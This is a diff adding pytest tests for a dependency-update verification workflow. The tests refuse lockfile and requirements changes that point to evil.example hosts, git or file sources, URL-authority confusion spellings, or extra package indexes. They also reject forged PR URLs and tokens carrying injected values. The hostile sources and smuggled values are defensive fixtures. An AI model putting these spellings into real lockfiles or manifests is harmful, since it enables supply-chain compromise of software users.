+    refused(tmp_path, shim_path, {"go.mod": base},
+            lambda r: write(r, "go.mod", base.replace("=> ./a", "=> ../b")),
+            expect="directive change outside require/go/toolchain")
+
+
+LOCK3 = {
+    "name": "t", "lockfileVersion": 3, "requires": True,
+    "packages": {
+        "": {"name": "t", "version": "1.0.0", "dependencies": {"a": "^1.0.0"}},
+        "node_modules/a": {"version": "1.0.0", "resolved": "https://registry.npmjs.org/a/-/a-1.0.0.tgz"},
+    },
+}
+
+
+def lock_with(**packages) -> str:
+    doc = json.loads(json.dumps(LOCK3))
+    doc["packages"].update(packages)
+    return json.dumps(doc, indent=2) + "\n"
+
+
+@pytest.mark.parametrize("record,expect", [
+    ({"link": True, "resolved": "../evil"}, "becomes a link"),
+    ({"version": "1.0.0", "resolved": "../evil"}, "new URL"),
+    ({"version": "1.0.0", "resolved": "git@github.com:o/r"}, "new URL"),
+    ({"version": "1.0.0", "resolved": "git+ssh://git@github.com/o/r.git"}, "authority"),
+    ({"version": "1.0.0", "resolved": "http://registry.npmjs.org/b/-/b-1.0.0.tgz"}, "new URL"),
+    ({"version": "1.0.0", "resolved": "https://evil.example/b-1.0.0.tgz"}, "new URL"),
+    ({"version": "github:o/r", "resolved": "https://registry.npmjs.org/b/-/b-1.0.0.tgz"}, "not a plain version"),
+])
+def test_refuses_npm_lock_records(tmp_path, shim_path, record, expect):
+    refused(tmp_path, shim_path, {"package-lock.json": lock_with()},
+            lambda r: write(r, "package-lock.json", lock_with(**{"node_modules/b": record})), expect=expect)
+
+
+def test_refuses_an_existing_record_turned_into_a_link(tmp_path, shim_path):
+    refused(tmp_path, shim_path, {"package-lock.json": lock_with()},
+            lambda r: write(r, "package-lock.json",
+                            lock_with(**{"node_modules/a": {"resolved": "../a", "link": True}})),
+            expect="becomes a link")
+
+
+def test_refuses_a_root_spec_that_is_not_a_range(tmp_path, shim_path):
+    root = {"name": "t", "version": "1.0.0", "dependencies": {"a": "git+https://evil.example/a.git"}}
+    refused(tmp_path, shim_path, {"package-lock.json": lock_with()},
+            lambda r: write(r, "package-lock.json", lock_with(**{"": root})), expect="is not a version range")
+
+
+def test_refuses_a_v1_nested_lock_change(tmp_path, shim_path):
+    v1 = {"name": "t", "lockfileVersion": 1, "dependencies": {
+        "a": {"version": "1.0.0", "resolved": "https://registry.npmjs.org/a/-/a-1.0.0.tgz",
+              "dependencies": {"b": {"version": "1.0.0", "resolved": "https://registry.npmjs.org/b/-/b-1.0.0.tgz"}}}}}
+    bad = json.loads(json.dumps(v1))
+    bad["dependencies"]["a"]["dependencies"]["b"]["resolved"] = "file:../b"
+    refused(tmp_path, shim_path, {"package-lock.json": json.dumps(v1, indent=2) + "\n"},
+            lambda r: write(r, "package-lock.json", json.dumps(bad, indent=2) + "\n"), expect="new URL")
+
+
+def test_npm_lock_registry_bump_is_accepted(tmp_path, shim_path):
+    repo = base_repo(tmp_path, {"package-lock.json": lock_with()})
+    checkout = fresh_checkout(tmp_path, repo)
+    write(repo, "package-lock.json", lock_with(**{
+        "node_modules/a": {"version": "1.0.1", "resolved": "https://registry.npmjs.org/a/-/a-1.0.1.tgz"}}))
+    v = run_verify(tmp_path, shim_path, checkout, forged_artifact(tmp_path, repo, raw_patch(repo)))
+    assert v.returncode == 0, v.stdout + v.stderr
+
+
+PNPM = ("lockfileVersion: '9.0'\n\nimporters:\n\n  .:\n    dependencies:\n      a:\n        specifier: ^1.0.0\n"
+        "        version: 1.0.0\n      local:\n        specifier: link:../local\n        version: link:../local\n"
+        "\npackages:\n\n  a@1.0.0:\n    resolution: {integrity: sha512-x, tarball: https://registry.npmjs.org/a/-/a-1.0.0.tgz}\n")
+
+
+@pytest.mark.parametrize("added,expect", [
+    ("      b:\n        version: git@github.com:o/r\n", "scp-style"),
+    ("      b:\n        version: github.com:o/r\n", "scp-style"),
+    # Identical text to an existing line elsewhere: no longer exempt.
+    ("      b:\n        version: link:../local\n", "local/git reference"),
+    ("      b:\n        version: file:../b\n", "local/git reference"),
+    ("      b:\n        version: github:o/r\n", "local/git reference"),
+    ("  b@1.0.0:\n    resolution: {tarball: https://evil.example/b.tgz}\n", "only https"),
+])
+def test_refuses_pnpm_lock_spellings(tmp_path, shim_path, added, expect):
+    refused(tmp_path, shim_path, {"pnpm-lock.yaml": PNPM},
+            lambda r: write(r, "pnpm-lock.yaml", PNPM.replace("\npackages:", added + "\npackages:")), expect=expect)
+
+
+def test_pnpm_registry_bump_is_accepted(tmp_path, shim_path):
+    repo = base_repo(tmp_path, {"pnpm-lock.yaml": PNPM})
+    checkout = fresh_checkout(tmp_path, repo)
+    write(repo, "pnpm-lock.yaml", PNPM.replace("1.0.0", "1.0.1"))
+    v = run_verify(tmp_path, shim_path, checkout, forged_artifact(tmp_path, repo, raw_patch(repo)))
+    assert v.returncode == 0, v.stdout + v.stderr
+
+
+# SC-10: requirements parsing and the line cap.
+@pytest.mark.parametrize("line", [
+    "-i https://evil.example/simple", "--index-url=https://evil.example/simple",
+    "-e git+https://evil.example/x.git#egg=x", "-r other.txt", "requests @ https://evil.example/r.whl",
+    "requests>=2.0", "requests==2.33.0 --extra-index-url https://evil.example",
+])
+def test_refuses_requirement_spellings(tmp_path, shim_path, line):
+    refused(tmp_path, shim_path, {"requirements.txt": "requests==2.31.0\n"},
+            lambda r: write(r, "requirements.txt", line + "\n"), expect="is not a pinned requirement")
+
+
+@pytest.mark.parametrize("content", [
+    "requests==2.33.0\n",
+    "requests[socks]==2.33.0 ; python_version >= \"3.8\"\n",
+    "requests==2.33.0 \\\n    --hash=sha256:" + "a" * 64 + "\n",
+    "requests==2.33.0 --hash=sha256:" + "b" * 64 + "  # pinned\n",
+    "requests~=2.33.0\n# comment\n\n",
+])
+def test_pinned_requirement_spellings_are_accepted(tmp_path, shim_path, content):
+    repo = base_repo(tmp_path, {"requirements.txt": "requests==2.31.0\n"})
+    checkout = fresh_checkout(tmp_path, repo)
+    write(repo, "requirements.txt", content)
+    v = run_verify(tmp_path, shim_path, checkout, forged_artifact(tmp_path, repo, raw_patch(repo)))
+    assert v.returncode == 0, v.stdout + v.stderr
+
+
+def test_refuses_an_overlong_added_line(tmp_path, shim_path):
+    refused(tmp_path, shim_path, {"requirements.txt": "requests==2.31.0\n"},
+            lambda r: write(r, "requirements.txt", "requests==2.33.0 # " + "x" * 5000 + "\n"),
+            expect="(cap 4096)")
+
+
+# SC-05: the PR kind needs the per-ecosystem results and the aggregate to agree.
+def eco_with(**tests):
+    eco = {e: {"changed": "true", "tests": "passed", "notes": ""} for e in ("npm", "go", "python")}
+    for e, t in tests.items():
+        eco[e]["tests"] = t
+    return eco
+
+
+@pytest.mark.parametrize("tests_failed,eco,expect", [
+    ("false", eco_with(go="failed"), "disagrees"),
+    ("true", eco_with(), "disagrees"),
+    ("false", eco_with(npm=""), "reports no test result"),
+    ("false", {e: {"changed": "false", "tests": "", "notes": ""} for e in ("npm", "go", "python")},
+     "no ecosystem reports a change"),
+])
+def test_refuses_inconsistent_test_results(tmp_path, shim_path, tests_failed, eco, expect):
+    refused(tmp_path, shim_path, {"package-lock.json": LOCK},
+            lambda r: write(r, "package-lock.json", LOCK.replace("1.0.0", "1.0.1")),
+            expect=expect, tests_failed=tests_failed, ecosystems=eco)
+
+
+def test_pr_body_labels_test_results_unverified(tmp_path, shim_path):
+    repo = base_repo(tmp_path, {"package-lock.json": LOCK})
+    checkout = fresh_checkout(tmp_path, repo)
+    write(repo, "package-lock.json", LOCK.replace("1.0.0", "1.0.1"))
+    v = run_verify(tmp_path, shim_path, checkout, forged_artifact(tmp_path, repo, raw_patch(repo)))
+    body = Path(v.outputs["body_path"]).read_text(encoding="utf-8")
+    assert "Tests (reported by the apply job, unverified)" in body
+
+
+# SC-11: bearer tokens reach curl on stdin, never argv.
+SECRET = 'tk_s3cret"q\\z'
+
+
+def run_with_curl_spy(tmp_path, shim_path, step_id, **env):
+    spy = tmp_path / "spy"
+    spy.mkdir()
+    work = tmp_path / "w"
+    work.mkdir()
+    proc = run_step(step_id, work, shim_path, {}, job="notify",
+                    CURL_ARGV=(spy / "argv").as_posix(), CURL_STDIN=(spy / "stdin").as_posix(), **env)
+    argv = (spy / "argv").read_text(encoding="utf-8") if (spy / "argv").exists() else None
+    stdin = (spy / "stdin").read_text(encoding="utf-8") if (spy / "stdin").exists() else None
+    return proc, argv, stdin
+
+
+NOTIFY_ENV = dict(NTFY_URL="https://ntfy.example/t", APPLY_RESULT="success", PUBLISH_RESULT="success",
+                  PR_OK_URL="https://github.com/o/r/pull/1", PR_BROKEN_URL="", REPO="o/r",
+                  SERVER_URL="https://github.com", RUN_ID="1")
+BRAIN_ENV = dict(PR_OK_URL="https://github.com/o/r/pull/1", PR_BROKEN_URL="", REPO="o/r",
+                 SERVER_URL="https://github.com", DATE_STR="2026-10-10")
+
+
+def test_ntfy_token_is_sent_on_stdin_not_argv(tmp_path, shim_path):
+    proc, argv, stdin = run_with_curl_spy(tmp_path, shim_path, "notify", NTFY_TOKEN=SECRET, **NOTIFY_ENV)
+    assert proc.returncode == 0, proc.stdout + proc.stderr
+    assert "tk_s3cret" not in argv and "Authorization" not in argv
+    assert "-K" in argv.split("\n")
+    assert stdin.strip() == 'header = "Authorization: Bearer tk_s3cret\\"q\\\\z"'
+
+
+def test_ntfy_without_token_sends_no_header(tmp_path, shim_path):
+    proc, argv, stdin = run_with_curl_spy(tmp_path, shim_path, "notify", NTFY_TOKEN="", **NOTIFY_ENV)
+    assert proc.returncode == 0, proc.stdout + proc.stderr
+    assert "Authorization" not in stdin and "Authorization" not in argv
+
+
+def test_brain_token_is_sent_on_stdin_not_argv(tmp_path, shim_path):
+    proc, argv, stdin = run_with_curl_spy(
+        tmp_path, shim_path, "brain", BRAIN_TOKEN=SECRET, **BRAIN_ENV)
+    assert proc.returncode == 0, proc.stdout + proc.stderr
+    assert "tk_s3cret" not in argv
+    assert stdin.strip() == 'header = "Authorization: Bearer tk_s3cret\\"q\\\\z"'
+
+
+def test_a_token_with_a_line_break_is_never_sent(tmp_path, shim_path):
+    proc, argv, stdin = run_with_curl_spy(tmp_path, shim_path, "notify", NTFY_TOKEN="a\nheader = x", **NOTIFY_ENV)
+    assert proc.returncode == 0
+    assert argv is None and stdin is None
+
+
+# SC-25: this repo's own pins are kept current.
+def test_this_repo_has_dependabot_for_both_workflow_trees():
+    cfg = yaml.safe_load((ROOT / ".github" / "dependabot.yml").read_text(encoding="utf-8"))
+    [gha] = [u for u in cfg["updates"] if u["package-ecosystem"] == "github-actions"]
+    assert set(gha["directories"]) == {"/", "/templates"}
+    assert gha["schedule"]["interval"] == "weekly"
+
+
+# ─── security gate pass 2 on PR #39 ──────────────────────────────────────────
+
+# SC-29: values from publish are job outputs; notify accepts only this repo's
+# own PR URL and a plain date.
+@pytest.mark.parametrize("url", [
+    "https://evil.example/o/r/pull/1", "https://github.com/o/other/pull/1", "https://github.com/o/r/pull/1x",
+    "https://github.com/o/r/pull/1\nTitle: forged", "https://github.com/o/r/pull/",
+])
+def test_notify_ignores_a_forged_pr_url(tmp_path, shim_path, url):
+    env = {**NOTIFY_ENV, "PR_OK_URL": url}
+    proc, argv, stdin = run_with_curl_spy(tmp_path, shim_path, "notify", NTFY_TOKEN=SECRET, **env)
+    assert proc.returncode == 0, proc.stdout + proc.stderr
+    assert argv is None, "nothing may be posted for a forged URL"
+    assert "malformed PR URL" in proc.stdout
+
+
+@pytest.mark.parametrize("override", [
+    {"PR_OK_URL": "https://evil.example/o/r/pull/1"},
+    {"DATE_STR": "2026-10-10) evil"},
+])
+def test_brain_ignores_forged_values(tmp_path, shim_path, override):
+    proc, argv, stdin = run_with_curl_spy(tmp_path, shim_path, "brain", BRAIN_TOKEN=SECRET, **{**BRAIN_ENV, **override})
+    assert proc.returncode == 0, proc.stdout + proc.stderr
+    assert argv is None
+
+
+def test_notify_reports_a_refused_publish(tmp_path, shim_path):
+    env = {**NOTIFY_ENV, "PUBLISH_RESULT": "failure", "PR_OK_URL": ""}
+    proc, argv, stdin = run_with_curl_spy(tmp_path, shim_path, "notify", NTFY_TOKEN="", **env)
+    assert proc.returncode == 0, proc.stdout + proc.stderr
+    assert "Title: auto-apply REFUSED: o/r" in argv
+
+
+# SC-19: the authority is checked before urlsplit; pnpm specifiers are an
+# allow-list. Each spelling is tried in an npm lockfile and in pnpm-lock.
+URL_SPELLINGS = [
+    ("https://evil.example\\@registry.npmjs.org/a.tgz", "authority"),
+    ("https://user@registry.npmjs.org/a.tgz", "authority"),
+    ("https://registry.npmjs.org @evil.example/a.tgz", "authority"),
+    ("../x", "new URL"),
+    ("owner/repo", "new URL"),
+]
+
+
+@pytest.mark.parametrize("url,expect", URL_SPELLINGS)
+def test_npm_lock_resolved_spellings(tmp_path, shim_path, url, expect):
+    refused(tmp_path, shim_path, {"package-lock.json": lock_with()},
+            lambda r: write(r, "package-lock.json",
+                            lock_with(**{"node_modules/b": {"version": "1.0.0", "resolved": url}})), expect=expect)
+
+
+@pytest.mark.parametrize("url,expect", [u for u in URL_SPELLINGS if "://" in u[0]])
+def test_pnpm_tarball_spellings(tmp_path, shim_path, url, expect):
+    added = "  b@1.0.0:\n    resolution: {tarball: " + url + "}\n"
+    refused(tmp_path, shim_path, {"pnpm-lock.yaml": PNPM},
+            lambda r: write(r, "pnpm-lock.yaml", PNPM + added), expect=expect)
+
+
+@pytest.mark.parametrize("spec", [
+    "owner/repo", "../x", "https://registry.npmjs.org/b/-/b-1.0.0.tgz", "workspace:*", "catalog:", "npm:evil@git+x",
+    "user/repo#semver:^1.0.0", "git+x", "1.0.0 || evil/x", "^1.0.0 evil", "file:../x",
+])
+def test_pnpm_specifier_allow_list_refuses(tmp_path, shim_path, spec):
+    added = "      b:\n        specifier: " + spec + "\n"
+    refused(tmp_path, shim_path, {"pnpm-lock.yaml": PNPM},
+            lambda r: write(r, "pnpm-lock.yaml", PNPM.replace("\npackages:", added + "\npackages:")),
+            expect="is not a version range")
+
+
+@pytest.mark.parametrize("spec", ["^1.2.0", "'~1.2.3'", '">=1.0.0 <2.0.0"', "1.2.3", "npm:@scope/pkg@^1.2.0", "latest",
+                                  "1.x", "*", "^1.0.0 || ^2.0.0", "1.0.0 - 2.0.0", "1.0.0-beta.1", "npm:pkg@~2.1.0"])
+def test_pnpm_specifier_allow_list_accepts(tmp_path, shim_path, spec):
+    repo = base_repo(tmp_path, {"pnpm-lock.yaml": PNPM})
+    checkout = fresh_checkout(tmp_path, repo)
+    write(repo, "pnpm-lock.yaml", PNPM.replace("specifier: ^1.0.0", "specifier: " + spec))
+    v = run_verify(tmp_path, shim_path, checkout, forged_artifact(tmp_path, repo, raw_patch(repo)))
+    assert v.returncode == 0, v.stdout + v.stderr
